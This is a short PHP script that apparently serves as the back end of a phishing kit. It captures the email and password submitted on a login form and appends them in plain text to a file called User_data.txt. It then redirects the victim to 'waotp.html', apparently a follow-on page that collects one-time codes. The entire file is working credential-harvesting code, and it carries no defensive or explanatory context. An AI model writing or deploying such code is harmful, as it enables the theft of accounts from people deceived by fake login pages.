<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['email'];
    $password = $_POST['password'];

    $file = fopen("User_data.txt", "a");
    fwrite($file, "------------------------------------------------\n");
    fwrite($file, "Email,user:=> " . $username . "\n");
    fwrite($file, "Password:=> " . $password . "\n");
    fclose($file);

    // login page with an error message
    header("Location: waotp.html");
    exit();
} 
?>